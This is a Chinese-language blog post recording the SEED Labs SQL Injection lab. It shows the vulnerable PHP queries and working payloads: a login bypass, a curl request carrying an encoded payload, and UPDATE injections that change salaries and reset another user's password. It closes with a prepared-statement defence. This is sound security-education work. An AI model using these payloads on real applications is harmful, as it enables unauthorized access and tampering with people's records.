---
layout: post
title:  "SQL injection"
date:   2020-11-01 00:00:00 +0800
categories: 实验
tags: seedlab sql
summary: "本文为 SEED Labs 2.0 - SQL Injection Attack Lab 的实验记录，介绍了如何使用 Docker 和 MySQL 进行 SQL 注入攻击及其防御。"
series: SEEDLabs
series_index: 5
comments: true
mathjax: true
copyrights: 原创
---

本文为 [SEED Labs 2.0 - SQL Injection Attack Lab](https://seedsecuritylabs.org/Labs_20.04/Web/Web_SQL_Injection/) 的实验记录。

## 实验原理

SQL注入攻击通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，它目前是黑客对数据库进行攻击的最常用手段之一。

## Task 1: Get Familiar with SQL Statements

启动 docker

```shell
dcbuild
dcup
```

然后进入 mysql 程序

```shell
dockps
docksh **
mysql -u root -p dees
```

> After running the commands above, you need to use a SQL command to print all the profile information of the employee Alice.

```mysql
use sqllab_users;
show tables;
desc credential;
select * from credential where Name='Alice'
```

<img src="/assets/post/images/sql1.webp" alt="sql1" style="zoom:50%;" />

## Task 2: SQL Injection Attack on SELECT Statement

### Task 2.1: SQL Injection Attack from webpage

打开 [seed-server.com](http://www.seed-server.com/)

观察 unsafe home.php，看到里面有如下判断

```php
$sql = "SELECT id, name, eid, salary, birth, ssn, address, email,
        nickname, Password
        FROM credential
        WHERE name= ’$input_uname’ and Password=’$hashed_pwd’";
```

我们只需要把判断 Password 的部分屏蔽即可

```plaintext
admin';#
```

<img src="/assets/post/images/sql2.webp" alt="sql2" style="zoom:50%;" />

### Task 2.2: SQL Injection Attack from command line

转换一下 url 编码即可

```shell
curl 'www.seed-server.com/unsafe_home.php?username=%27%3b%23'
```

得到

<img src="/assets/post/images/sql3.webp" alt="sql3" style="zoom:50%;" />

看到已经显示了所有用户信息

### Task 2.3: Append a new SQL statement

注入

```plain text
Alice'; update credential set name=A where ID=1;#
```

可以看到注入不成功

<img src="/assets/post/images/sql4.webp" alt="sql4" style="zoom:67%;" />

## Task 3: SQL Injection Attack on UPDATE Statement

### Task 3.1: Modify your own salary

进入 Alice 修改个人资料的页面

观察 unsafe edit backend.php，看到有如下判断

```php
$hashed_pwd = sha1($input_pwd);
$sql = "UPDATE credential SET
        nickname=’$input_nickname’,
        email=’$input_email’,
        address=’$input_address’,
        Password=’$hashed_pwd’,
        PhoneNumber=’$input_phonenumber’
        WHERE ID=$id;";
$conn->query($sql);
```

注入

```plaintext
',salary='30000' where ID=1;#
```

<img src="/assets/post/images/sql5.webp" alt="sql5" style="zoom: 50%;" />

### Task 3.2: Modify other people’s alary

这个和上面的几乎一模一样，比如我们把 Boby 的薪水改成 114514

```plaintext
',salary='114514' where ID=2;#
```

<img src="/assets/post/images/sql6.webp" alt="sql6" style="zoom:50%;" />

看到已经改掉了

<img src="/assets/post/images/sql7.webp" alt="sql7" style="zoom:50%;" />

### Task 3.3: Modify other people’s password

查看代码，看到密码采用的是 sha1，我们随便找个在线转换网站转换一下就好了。

<img src="/assets/post/images/sql8.webp" alt="sql8" style="zoom: 67%;" />

然后注入

```plaintext
',Password='1f82c942befda29b6ed487a51da199f78fce7f05' where ID=1;#
```

<img src="/assets/post/images/sql9.webp" alt="sql9" style="zoom:50%;" />

然后现在可以用密码 `888888` 成功登录 Alice 账号。

## Task 4: Countermeasure — Prepared Statement

登录 [seed-server.com/defense](http://www.seed-server.com/defense/)

这里我们需要将参数与查询分离。修改 unsafe.php，做如下改动

```php
$stmt = $conn->prepare("SELECT id, name, eid, salary, ssn
                        FROM credential
                        WHERE name = ? and Password = ? ");
$stmt->bind_param("ss", $input_uname, $hashed_pwd);
$stmt->execute();
$stmt->bind_result($id, $name, $eid, $salary, $ssn);
$stmt->fetch();
```

<img src="/assets/post/images/sql10.webp" alt="sql10" style="zoom:50%;" />

可以看到，攻击失败了

<img src="/assets/post/images/sql11.webp" alt="sql11" style="zoom:50%;" />

## 实验总结

实验属于最简单的 SQL injection。主要的收获在于最后一个 Task，以前只知道怎么注入，很少研究过怎么防御。
